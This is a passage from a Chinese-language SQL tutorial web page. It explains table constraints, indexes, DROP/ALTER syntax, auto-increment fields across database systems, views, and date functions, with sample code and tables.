class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int NOT NULL,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">CONSTRAINT uc_PersonID UNIQUE (P_Id,LastName)</span><br><span class="line">)</span><br><span class="line"># ALTER TABLE 时的 SQL UNIQUE 约束</span><br><span class="line">ALTER TABLE Persons</span><br><span class="line">ADD UNIQUE (P_Id);</span><br><span class="line"># 定义多列约束</span><br><span class="line">ALTER TABLE Persons</span><br><span class="line">ADD CONSTRAINT uc_PersonID UNIQUE (P_Id,LastName);</span><br><span class="line"># 撤销 UNIQUE 约束</span><br><span class="line"> # mysql</span><br><span class="line">ALTER TABLE Persons</span><br><span class="line">DROP INDEX uc_PersonID</span><br><span class="line"> # SQL Server / Oracle / MS Access</span><br><span class="line">ALTER TABLE Persons</span><br><span class="line">DROP CONSTRAINT uc_PersonID</span><br></pre></td></tr></table></figure></li>
<li><p><strong>PRIMARY KEY</strong> - NOT NULL 和 UNIQUE 的结合。确保某列（或两个列多个列的结合）有唯一标识，有助于更容易更快速地找到表中的一个特定的记录。</p>
<p> 主键必须包含唯一的值。</p>
<p> 主键列不能包含 NULL 值。</p>
<p> 每个表都应该有一个主键，并且每个表只能有一个主键。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># CREATE TABLE 时的 SQL PRIMARY KEY 约束</span><br><span class="line"># mysql </span><br><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int NOT NULL,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">PRIMARY KEY (P_Id)</span><br><span class="line">)</span><br><span class="line"># SQL Server / Oracle / MS Access</span><br><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int NOT NULL PRIMARY KEY,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br><span class="line"># 定义多个列的 PRIMARY KEY 约束</span><br><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int NOT NULL,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">CONSTRAINT pk_PersonID PRIMARY KEY (P_Id,LastName)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># ALTER TABLE 时的 SQL PRIMARY KEY 约束</span><br><span class="line">ALTER TABLE Persons</span><br><span class="line">ADD PRIMARY KEY (P_Id)</span><br><span class="line"># 定义多列</span><br><span class="line">ALTER TABLE Persons</span><br><span class="line">ADD CONSTRAINT pk_PersonID PRIMARY KEY (P_Id,LastName)</span><br><span class="line"></span><br><span class="line"># 撤销 PRIMARY KEY 约束</span><br><span class="line"> # mysql</span><br><span class="line">ALTER TABLE Persons</span><br><span class="line">DROP PRIMARY KEY</span><br><span class="line"> # SQL Server / Oracle / MS Access</span><br><span class="line">ALTER TABLE Persons</span><br><span class="line">DROP CONSTRAINT pk_PersonID</span><br></pre></td></tr></table></figure></li>
<li><p><strong>FOREIGN KEY</strong> - 保证一个表中的数据匹配另一个表中的值的参照完整性。</p>
<p> 一个表中的 FOREIGN KEY 指向另一个表中的 UNIQUE KEY(唯一约束的键)。</p>
<p> FOREIGN KEY 约束用于预防破坏表之间连接的行为。</p>
<p> FOREIGN KEY 约束也能防止非法数据插入外键列，因为它必须是它指向的那个表中的值之一。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># CREATE TABLE 时的 SQL FOREIGN KEY 约束</span><br><span class="line">#mysql</span><br><span class="line">CREATE TABLE Orders</span><br><span class="line">(</span><br><span class="line">O_Id int NOT NULL,</span><br><span class="line">OrderNo int NOT NULL,</span><br><span class="line">P_Id int,</span><br><span class="line">PRIMARY KEY (O_Id),</span><br><span class="line">FOREIGN KEY (P_Id) REFERENCES Persons(P_Id)</span><br><span class="line">)</span><br><span class="line"># SQL Server / Oracle / MS Access</span><br><span class="line">CREATE TABLE Orders</span><br><span class="line">(</span><br><span class="line">O_Id int NOT NULL PRIMARY KEY,</span><br><span class="line">OrderNo int NOT NULL,</span><br><span class="line">P_Id int FOREIGN KEY REFERENCES Persons(P_Id)</span><br><span class="line">)</span><br><span class="line"># 定义多个列的 FOREIGN KEY 约束</span><br><span class="line">CREATE TABLE Orders</span><br><span class="line">(</span><br><span class="line">O_Id int NOT NULL,</span><br><span class="line">OrderNo int NOT NULL,</span><br><span class="line">P_Id int,</span><br><span class="line">PRIMARY KEY (O_Id),</span><br><span class="line">CONSTRAINT fk_PerOrders FOREIGN KEY (P_Id)</span><br><span class="line">REFERENCES Persons(P_Id)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># ALTER TABLE 时的 SQL FOREIGN KEY 约束</span><br><span class="line">ALTER TABLE Orders</span><br><span class="line">ADD FOREIGN KEY (P_Id)</span><br><span class="line">REFERENCES Persons(P_Id)</span><br><span class="line"># 定义多个列的 FOREIGN KEY 约束</span><br><span class="line">ALTER TABLE Orders</span><br><span class="line">ADD CONSTRAINT fk_PerOrders</span><br><span class="line">FOREIGN KEY (P_Id)</span><br><span class="line">REFERENCES Persons(P_Id)</span><br><span class="line"># 撤销 FOREIGN KEY 约束</span><br><span class="line"> # mysql</span><br><span class="line">ALTER TABLE Orders</span><br><span class="line">DROP FOREIGN KEY fk_PerOrders</span><br><span class="line"> # SQL Server / Oracle / MS Access</span><br><span class="line">ALTER TABLE Orders</span><br><span class="line">DROP CONSTRAINT fk_PerOrders</span><br></pre></td></tr></table></figure></li>
<li><p><strong>CHECK</strong> - 保证列中的值符合指定的条件。</p>
<p> CHECK 约束用于限制列中的值的范围。</p>
<p> 如果对单个列定义 CHECK 约束，那么该列只允许特定的值。</p>
<p> 如果对一个表定义 CHECK 约束，那么此约束会基于行中其他列的值在特定的列中对值进行限制。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># CREATE TABLE 时的 SQL CHECK 约束</span><br><span class="line"># mysql</span><br><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int NOT NULL,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">CHECK (P_Id&gt;0)</span><br><span class="line">)</span><br><span class="line"># SQL Server / Oracle / MS Access</span><br><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int NOT NULL CHECK (P_Id&gt;0),</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br><span class="line"># 定义多个列的 CHECK 约束</span><br><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int NOT NULL,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">CONSTRAINT chk_Person CHECK (P_Id&gt;0 AND City='Sandnes')</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># ALTER TABLE 时的 SQL CHECK 约束</span><br><span class="line">ALTER TABLE Persons</span><br><span class="line">ADD CHECK (P_Id&gt;0)</span><br><span class="line"> # 定义多个列的 CHECK 约束</span><br><span class="line">ALTER TABLE Persons</span><br><span class="line">ADD CONSTRAINT chk_Person CHECK (P_Id&gt;0 AND City='Sandnes')</span><br><span class="line"></span><br><span class="line"># 撤销 CHECK 约束</span><br><span class="line"> # SQL Server / Oracle / MS Access</span><br><span class="line">ALTER TABLE Persons</span><br><span class="line">DROP CONSTRAINT chk_Person</span><br><span class="line"> # mysql</span><br><span class="line">ALTER TABLE Persons</span><br><span class="line">DROP CHECK chk_Person</span><br></pre></td></tr></table></figure></li>
<li><p><strong>DEFAULT</strong> - 规定没有给列赋值时的默认值。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># CREATE TABLE 时的 SQL DEFAULT 约束</span><br><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">    P_Id int NOT NULL,</span><br><span class="line">    LastName varchar(255) NOT NULL,</span><br><span class="line">    FirstName varchar(255),</span><br><span class="line">    Address varchar(255),</span><br><span class="line">    City varchar(255) DEFAULT 'Sandnes'</span><br><span class="line">)</span><br><span class="line"># 通过使用类似 GETDATE() 这样的函数，DEFAULT 约束也可以用于插入系统值</span><br><span class="line">CREATE TABLE Orders</span><br><span class="line">(</span><br><span class="line">    O_Id int NOT NULL,</span><br><span class="line">    OrderNo int NOT NULL,</span><br><span class="line">    P_Id int,</span><br><span class="line">    OrderDate date DEFAULT GETDATE()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># ALTER TABLE 时的 SQL DEFAULT 约束</span><br><span class="line"> # mysql</span><br><span class="line">ALTER TABLE Persons</span><br><span class="line">ALTER City SET DEFAULT 'SANDNES'</span><br><span class="line"> # SQL Server / MS Access</span><br><span class="line">ALTER TABLE Persons</span><br><span class="line">ADD CONSTRAINT ab_c DEFAULT 'SANDNES' for City</span><br><span class="line"> # Oracle</span><br><span class="line">ALTER TABLE Persons</span><br><span class="line">MODIFY City DEFAULT 'SANDNES'</span><br><span class="line"></span><br><span class="line"># 撤销 DEFAULT 约束</span><br><span class="line"> # mysql</span><br><span class="line">ALTER TABLE Persons</span><br><span class="line">ALTER City DROP DEFAULT</span><br><span class="line"> # SQL Server / Oracle / MS Access</span><br><span class="line">ALTER TABLE Persons</span><br><span class="line">ALTER COLUMN City DROP DEFAULT</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="CREATE-INDEX-语句"><a href="#CREATE-INDEX-语句" class="headerlink" title="CREATE INDEX 语句"></a><strong>CREATE INDEX 语句</strong></h3><p>——用于在表中创建索引</p>
<p>用户无法看到索引，它们只能被用来加速搜索/查询。</p>
<p><strong>注释：</strong>更新一个包含索引的表需要比更新一个没有索引的表花费更多的时间，这是由于索引本身也需要更新。因此，理想的做法是仅仅在常常被搜索的列（以及表）上面创建索引。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 在表上创建一个简单的索引</span><br><span class="line">CREATE INDEX index_name</span><br><span class="line">ON table_name (column_name)</span><br><span class="line"># 在表上创建一个唯一的索引</span><br><span class="line">CREATE UNIQUE INDEX index_name</span><br><span class="line">ON table_name (column_name)</span><br></pre></td></tr></table></figure>

<h3 id="Drop-子句"><a href="#Drop-子句" class="headerlink" title="Drop 子句"></a><strong>Drop 子句</strong></h3><p>——用于删除索引、表和数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># DROP INDEX 删除表中的索引</span><br><span class="line"> # MS Access</span><br><span class="line"> DROP INDEX index_name ON table_name</span><br><span class="line"> # MS SQL Server</span><br><span class="line"> DROP INDEX table_name.index_name</span><br><span class="line"> # DB2/Oracle</span><br><span class="line"> DROP INDEX index_name</span><br><span class="line"> # MySQL</span><br><span class="line"> ALTER TABLE table_name DROP INDEX index_name</span><br><span class="line"> </span><br><span class="line"># DROP TABLE 用于删除表</span><br><span class="line">DROP TABLE table_name</span><br><span class="line"># DROP DATABASE 删除数据库</span><br><span class="line">DROP DATABASE database_name</span><br><span class="line"># TRUNCATE TABLE 删除表内的数据</span><br><span class="line">TRUNCATE TABLE table_name</span><br></pre></td></tr></table></figure>

<h3 id="ALTER-TABLE-语句"><a href="#ALTER-TABLE-语句" class="headerlink" title="ALTER TABLE 语句"></a><strong>ALTER TABLE 语句</strong></h3><p>——用于在已有的表中添加、删除或修改列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 在表中添加列</span><br><span class="line">ALTER TABLE table_name</span><br><span class="line">ADD column_name datatype</span><br><span class="line"># 删除表中的列</span><br><span class="line">ALTER TABLE table_name</span><br><span class="line">DROP COLUMN column_name</span><br><span class="line"></span><br><span class="line"># 改变表中列的数据类型</span><br><span class="line"> # SQL Server / MS Access</span><br><span class="line">ALTER TABLE table_name</span><br><span class="line">ALTER COLUMN column_name datatype</span><br><span class="line"> # My SQL / Oracle</span><br><span class="line">ALTER TABLE table_name</span><br><span class="line">MODIFY COLUMN column_name datatype</span><br></pre></td></tr></table></figure>

<h3 id="AUTO-INCREMENT-字段"><a href="#AUTO-INCREMENT-字段" class="headerlink" title="AUTO INCREMENT 字段"></a><strong>AUTO INCREMENT 字段</strong></h3><p>——在新记录插入表中时生成一个唯一的数字</p>
<p>在每次插入新记录时，通常希望自动地创建主键字段的值。可以在表中创建一个 auto-increment 字段。</p>
<ol>
<li><p>mysql</p>
<p>下面的 SQL 语句把 “Persons” 表中的 “ID” 列定义为 auto-increment 主键字段：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">ID int NOT NULL AUTO_INCREMENT,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">PRIMARY KEY (ID)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>MySQL 使用 AUTO_INCREMENT 关键字来执行 auto-increment 任务。</p>
<p>默认地，AUTO_INCREMENT 的开始值是 1，每条新记录递增 1。</p>
<p>要让 AUTO_INCREMENT 序列以其他的值起始，请使用下面的 SQL 语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Persons AUTO_INCREMENT=100</span><br></pre></td></tr></table></figure>

<p>要在 “Persons” 表中插入新记录，不必为 “ID” 列规定值（会自动添加一个唯一的值）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO Persons (FirstName,LastName)</span><br><span class="line">VALUES ('Lars','Monsen')</span><br></pre></td></tr></table></figure>

<p>上面的 SQL 语句会在 “Persons” 表中插入一条新记录。”ID” 列会被赋予一个唯一的值。”FirstName” 列会被设置为 “Lars”，”LastName” 列会被设置为 “Monsen”。</p>
</li>
<li><p>SQL Server</p>
<p>下面的 SQL 语句把 “Persons” 表中的 “ID” 列定义为 auto-increment 主键字段：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">ID int IDENTITY(1,1) PRIMARY KEY,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>MS SQL Server 使用 IDENTITY 关键字来执行 auto-increment 任务。</p>
<p>在上面的实例中，IDENTITY 的开始值是 1，每条新记录递增 1。</p>
<p><strong>提示：</strong>要规定 “ID” 列以 10 起始且递增 5，请把 identity 改为 IDENTITY(10,5)。</p>
<p>要在 “Persons” 表中插入新记录，不必为 “ID” 列规定值（会自动添加一个唯一的值）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO Persons (FirstName,LastName)</span><br><span class="line">VALUES ('Lars','Monsen')</span><br></pre></td></tr></table></figure>

<p>上面的 SQL 语句会在 “Persons” 表中插入一条新记录。”ID” 列会被赋予一个唯一的值。”FirstName” 列会被设置为 “Lars”，”LastName” 列会被设置为 “Monsen”。</p>
</li>
<li><p>Access</p>
<p>下面的 SQL 语句把 “Persons” 表中的 “ID” 列定义为 auto-increment 主键字段：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">ID Integer PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>MS Access 使用 AUTOINCREMENT 关键字来执行 auto-increment 任务。</p>
<p>默认地，AUTOINCREMENT 的开始值是 1，每条新记录递增 1。</p>
<p><strong>提示：</strong>要规定 “ID” 列以 10 起始且递增 5，请把 autoincrement 改为 AUTOINCREMENT(10,5)。</p>
<p>要在 “Persons” 表中插入新记录，不必为 “ID” 列规定值（会自动添加一个唯一的值）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO Persons (FirstName,LastName)</span><br><span class="line">VALUES ('Lars','Monsen')</span><br></pre></td></tr></table></figure>

<p>上面的 SQL 语句会在 “Persons” 表中插入一条新记录。”ID” 列会被赋予一个唯一的值。”FirstName” 列会被设置为 “Lars”，”LastName” 列会被设置为 “Monsen”。</p>
</li>
<li><p>Oracle</p>
<p>在 Oracle 中，代码稍微复杂一点。</p>
<p>必须通过 sequence 对象（该对象生成数字序列）创建 auto-increment 字段。</p>
<p>请使用下面的 CREATE SEQUENCE 语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE SEQUENCE seq_person</span><br><span class="line">MINVALUE 1</span><br><span class="line">START WITH 1</span><br><span class="line">INCREMENT BY 1</span><br><span class="line">CACHE 10</span><br></pre></td></tr></table></figure>

<p>上面的代码创建一个名为 seq_person 的 sequence 对象，它以 1 起始且以 1 递增。该对象缓存 10 个值以提高性能。cache 选项规定了为了提高访问速度要存储多少个序列值。</p>
<p>要在 “Persons” 表中插入新记录，必须使用 nextval 函数（该函数从 seq_person 序列中取回下一个值）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO Persons (ID,FirstName,LastName)</span><br><span class="line">VALUES (seq_person.nextval,'Lars','Monsen')</span><br></pre></td></tr></table></figure>

<p>上面的 SQL 语句会在 “Persons” 表中插入一条新记录。”ID” 列会被赋值为来自 seq_person 序列的下一个数字。”FirstName”列 会被设置为 “Lars”，”LastName” 列会被设置为 “Monsen”。</p>
</li>
</ol>
<h3 id="SQL视图"><a href="#SQL视图" class="headerlink" title="SQL视图"></a>SQL视图</h3><ol>
<li><p>SQL CREATE VIEW 语句</p>
<p> 在 SQL 中，视图是基于 SQL 语句的结果集的可视化的表。</p>
<p> 视图包含行和列，就像一个真实的表。视图中的字段就是来自一个或多个数据库中的真实的表中的字段。</p>
<p> 可以向视图添加 SQL 函数、WHERE 以及 JOIN 语句，也可以呈现数据，就像这些数据来自于某个单一的表一样。</p>
</li>
<li><p>SQL CREATE VIEW 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE VIEW view_name AS</span><br><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE condition</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>视图总是显示最新的数据！每当用户查询视图时，数据库引擎通过使用视图的 SQL 语句重建数据。</p>
</li>
<li><p>SQL CREATE VIEW 实例</p>
<p>样本数据库 Northwind 拥有一些被默认安装的视图。</p>
<p>视图 “Current Product List” 会从 “Products” 表列出所有正在使用的产品（未停产的产品）。这个视图使用下面的 SQL 创建：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE VIEW [Current Product List] AS</span><br><span class="line">SELECT ProductID,ProductName</span><br><span class="line">FROM Products</span><br><span class="line">WHERE Discontinued=No</span><br></pre></td></tr></table></figure>

<p>可以像这样查询上面这个视图：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM [Current Product List]</span><br></pre></td></tr></table></figure>

<p>Northwind 样本数据库的另一个视图会选取 “Products” 表中所有单位价格高于平均单位价格的产品：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE VIEW [Products Above Average Price] AS</span><br><span class="line">SELECT ProductName,UnitPrice</span><br><span class="line">FROM Products</span><br><span class="line">WHERE UnitPrice&gt;(SELECT AVG(UnitPrice) FROM Products)</span><br></pre></td></tr></table></figure>

<p>可以像这样查询上面这个视图：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM [Products Above Average Price]</span><br></pre></td></tr></table></figure>

<p>Northwind 样本数据库的另一个视图会计算在 1997 年每个种类的销售总数。请注意，这个视图会从另一个名为 “Product Sales for 1997” 的视图那里选取数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE VIEW [Category Sales For 1997] AS</span><br><span class="line">SELECT DISTINCT CategoryName,Sum(ProductSales) AS CategorySales</span><br><span class="line">FROM [Product Sales for 1997]</span><br><span class="line">GROUP BY CategoryName</span><br></pre></td></tr></table></figure>

<p>可以像这样查询上面这个视图：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM [Category Sales For 1997]</span><br></pre></td></tr></table></figure>

<p>也可以向查询添加条件。现在，仅仅需要查看 “Beverages” 类的销售总数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM [Category Sales For 1997]</span><br><span class="line">WHERE CategoryName='Beverages'</span><br></pre></td></tr></table></figure></li>
<li><p>SQL 更新视图</p>
<p>可以使用下面的语法来更新视图：</p>
<ol>
<li><p>SQL CREATE OR REPLACE VIEW 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE OR REPLACE VIEW view_name AS</span><br><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE condition</span><br></pre></td></tr></table></figure>

<p>现在，希望向 “Current Product List” 视图添加 “Category” 列将通过下列 SQL 更新视图：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE VIEW [Current Product List] AS</span><br><span class="line">SELECT ProductID,ProductName,Category</span><br><span class="line">FROM Products</span><br><span class="line">WHERE Discontinued=No</span><br></pre></td></tr></table></figure></li>
<li><p>SQL Server</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER VIEW [ schema_name . ] view_name [ ( column [ ,...n ] ) ] </span><br><span class="line">[ WITH &lt;view_attribute&gt; [ ,...n ] ] </span><br><span class="line">AS select_statement </span><br><span class="line">[ WITH CHECK OPTION ] [ ; ]</span><br><span class="line"></span><br><span class="line">&lt;view_attribute&gt; ::= </span><br><span class="line">{ </span><br><span class="line">    [ ENCRYPTION ]</span><br><span class="line">    [ SCHEMABINDING ]</span><br><span class="line">    [ VIEW_METADATA ]     </span><br><span class="line">} </span><br></pre></td></tr></table></figure>

<p><strong>schema_name:</strong> 视图所属架构的名称。</p>
<p><strong>view_name:</strong> 要更改的视图。</p>
<p><strong>column:</strong> 将成为指定视图的一部分的一个或多个列的名称（以逗号分隔）。</p>
</li>
</ol>
</li>
<li><p>SQL 撤销视图</p>
<p>可以通过 DROP VIEW 命令来删除视图。</p>
<p>SQL DROP VIEW 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP VIEW view_name</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="SQL-Date-函数"><a href="#SQL-Date-函数" class="headerlink" title="SQL Date 函数"></a>SQL Date 函数</h3><ol>
<li><p><strong>MySQL Date 函数</strong></p>
<p>下面的表格列出了 MySQL 中最重要的内建日期函数：</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><a href="https://www.runoob.com/sql/func-now.html">NOW()</a></td>
<td align="left">返回当前的日期和时间</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/sql/func-curdate.html">CURDATE()</a></td>
<td align="left">返回当前的日期</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/sql/func-curtime.html">CURTIME()</a></td>
<td align="left">返回当前的时间</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/sql/func-date.html">DATE()</a></td>
<td align="left">提取日期或日期/时间表达式的日期部分</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/sql/func-extract.html">EXTRACT()</a></td>
<td align="left">返回日期/时间的单独部分</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/sql/func-date-add.html">DATE_ADD()</a></td>
<td align="left">向日期添加指定的时间间隔</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/sql/func-date-sub.html">DATE_SUB()</a></td>
<td align="left">从日期减去指定的时间间隔</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/sql/func-datediff-mysql.html">DATEDIFF()</a></td>
<td align="left">返回两个日期之间的天数</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/sql/func-date-format.html">DATE_FORMAT()</a></td>
<td align="left">用不同的格式显示日期/时间</td>
</tr>
</tbody></table>
</li>
<li><p><strong>SQL Server Date 函数</strong></p>
<p>下面的表格列出了 SQL Server 中最重要的内建日期函数：</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><a href="https://www.runoob.com/sql/func-getdate.html">GETDATE()</a></td>
<td align="left">返回当前的日期和时间</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/sql/func-datepart.html">DATEPART()</a></td>
<td align="left">返回日期/时间的单独部分</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/sql/func-dateadd.html">DATEADD()</a></td>
<td align="left">在日期中添加或减去指定的时间间隔</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/sql/func-datediff.html">DATEDIFF()</a></td>
<td align="left">返回两个日期之间的时间</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/sql/func-convert.html">CONVERT()</a></td>
<td align="left">用不同的格式显示日期/时间</td>
</tr>
</tbody></table>
</li>
<li><p><strong>SQL Date 数据类型</strong></p>
<ul>
<li><p><strong>MySQL</strong> 使用下列数据类型在数据库中存储日期或日期/时间值：</p>
<ul>
<li>DATE - 格式：YYYY-MM-DD</li>
<li>DATETIME - 格式：YYYY-MM-DD HH:MM:SS</li>
<li>TIMESTAMP - 格式：YYYY-MM-DD HH:MM:SS</li>
<li>YEAR - 格式：YYYY 或 YY</li>
</ul>
</li>
<li><p><strong>SQL Server</strong> 使用下列数据类型在数据库中存储日期或日期/时间值：</p>
<ul>
<li>DATE - 格式：YYYY-MM-DD</li>
<li>DATETIME - 格式：YYYY-MM-DD HH:MM:SS</li>
<li>SMALLDATETIME - 格式：YYYY-MM-DD HH:MM:SS</li>
<li>TIMESTAMP - 格式：唯一的数字</li>
</ul>
<p><strong>注释：</strong>在数据库中创建一个新表时，需要为列选择数据类型！</p>
</li>
</ul>
</li>
<li><p><strong>SQL 日期处理</strong></p>
<p>如果不涉及时间部分，那么可以轻松地比较两个日期！</p>
<p>假设有如下的 “Orders” 表：</p>
<table>
<thead>
<tr>
<th align="left">OrderId</th>
<th align="left">ProductName</th>
<th align="left">OrderDate</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Geitost</td>
<td align="left">2008-11-11</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Camembert Pierrot</td>
<td align="left">2008-11-09</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Mozzarella di Giovanni</td>
<td align="left">2008-11-11</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">Mascarpone Fabioli</td>
<td align="left">2008-10-29</td>
</tr>
</tbody></table>
<p>现在，希望从上表中选取 OrderDate 为 “2008-11-11” 的记录。</p>
<p>使用下面的 SELECT 语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM Orders WHERE OrderDate='2008-11-11'</span><br></pre></td></tr></table></figure>

<p>结果集如下所示：</p>
<table>
<thead>
<tr>
<th align="left">OrderId</th>
<th align="left">ProductName</th>
<th align="left">OrderDate</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Geitost</td>
<td align="left">2008-11-11</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Mozzarella di Giovanni</td>
<td align="left">2008-11-11</td>
</tr>
</tbody></table>
<p>现在，假设 “Orders” 表如下所示（请注意 “OrderDate” 列中的时间部分）：</p>
<table>
<thead>
<tr>
<th align="left">OrderId</th>
<th align="left">ProductName</th>
<th align="left">OrderDate</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Geitost</td>
<td align="left">2008-11-11 13:23:44</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Camembert Pierrot</td>
<td align="left">2008-11-09 15:45:21</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Mozzarella di Giovanni</td>
<td align="left">2008-11-11 11:12:01</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">Mascarpone Fabioli</td>
<td align="left">2008-10-29 14:56:59</td>
</tr>
</tbody></table>
<p>如果使用和上面一样的 SELECT 语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM Orders WHERE OrderDate='2008-11-11'</span><br><span class="line"># or</span><br><span class="line">SELECT * FROM Orders WHERE OrderDate='2008-11-11 00：00：00'</span><br></pre></td></tr></table></figure>

<p>那么将得不到结果！因为表中没有”2008-11-11 00:00:00”日期。如果没有时间部分，默认时间为 00:00:00。</p>
<p><strong>提示：</strong>如果希望使查询简单且更易维护，那么请不要在日期中使用时间部分！</p>
</li>
</ol>
